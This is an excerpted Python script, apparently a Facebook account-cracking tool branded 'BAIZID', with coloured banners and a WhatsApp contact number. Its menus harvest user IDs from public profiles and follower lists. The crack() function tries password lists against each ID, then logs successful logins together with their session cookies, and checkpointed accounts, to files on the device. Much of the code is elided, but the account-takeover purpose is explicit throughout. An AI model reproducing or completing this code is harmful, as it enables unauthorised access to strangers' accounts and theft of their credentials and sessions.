...
def banner():
	clear()
	sol()
	ban=''' \033[1;95m𝐁𝐀𝐈𝐙𝐈𝐃-𝐌𝐎𝐒𝐓𝐀𝐅𝐀\033[1;95m
   
 

\033[1;91m    ____  ___    _________   ________\033[1;91m 
\033[1;94m   / __ )/   |  /  _/__  /  /  _/ __ \\\033[1;94m
\033[1;93m  / __  / /| |  / /   / /   / // / / / \033[1;93m
\033[1;96m / /_/ / ___ |_/ /   / /___/ // /_/ / \033[1;96m
\033[1;95m/_____/_/  |_/___/  /____/___/_____/\033[1;95m  \033[1;94m𝐯𝐞𝐫𝐬𝐢𝐨𝐧: 𝟐.𝟎.𝟒\033[1;94m

\033[1;96m𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 : +8801867705596\033[1;96m                                                               '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             \033[1;94mWELLCOME\033[1;94m \033[1;93m:\033[1;93m [green] 𝐁𝐀𝐈𝐙𝐈𝐃 PUBLIC TOOL[purple] '))
...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[bold green] \033[1;94m[√]\033[1;94m\033[1;95m1.\033[1;95m \033[1;93mCRACK PUBLIK ID\033[1;93m\n \033[1;94m[√]\033[1;94m\033[1;95m2.\033[1;95m \033[1;96mCHEK BAIZIDS\033[1;96m\n \033[1;94m[√]\033[1;94m\033[1;95m0.\033[1;96m \033[1;91mEXIT\033[1;91m [bold green]')) 
...
def ARIFt():
	...
	print('=>CP IDZ ')
	print('=>EXIT	')
	kz = input('\\033[1;96m=>CHOOSE :\033[1;96m ')
	if kz in ['1','01']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\033[1;95m=>ENTER LIMT IDZ :\033[1;95m '))
	except ValueError:
		print('{k}=>NOT JANI ')
		exit()
...
def dump_pengikut():
	...
	pil = input('➥➣\033[1;94mENTER ID LNK :\033[1;94m ')
	try:
...
def setting():
	...
	print('')
	hu = input('\033[1;96m=>CHOOSE :\033[1;96m ')
	if hu in ['1','01']:
	...
	print('')
	hc = input('\033[1;96m>> CHOOSE :\033[1;96m ')
	if hc in ['1','01']:
...
def passwrd():
	...
	print(f'                    {m}B {k}A {h}I {u}Z {b}I {m}D {u}  ★  {b}M {u}O {h}S {k}T {m}A {u}F {h}A {b}')
	print('')
	print(f'=>BAIZID {h}OK{u} CHEK : {h}OK/%s {b}'%(okc))
	print(f'=>BAIZID {k}CP{h} CHEK : {k}CP/%s {b}'%(cpc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}𝐁𝐀𝐈𝐙𝐈𝐃-🌹-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      🔥✨ 𝐁𝐀𝐈𝐙𝐈𝐃-OK 🔥✨[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/𝐁𝐀𝐈𝐙𝐈𝐃/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/𝐁𝐀𝐈𝐙𝐈𝐃/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='-𝐁𝐀𝐈𝐙𝐈𝐃  OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]𝐁𝐀𝐈𝐙𝐈𝐃  OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='𝐁𝐀𝐈𝐙𝐈𝐃  CP'))
					open('/sdcard/𝐁𝐀𝐈𝐙𝐈𝐃G/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
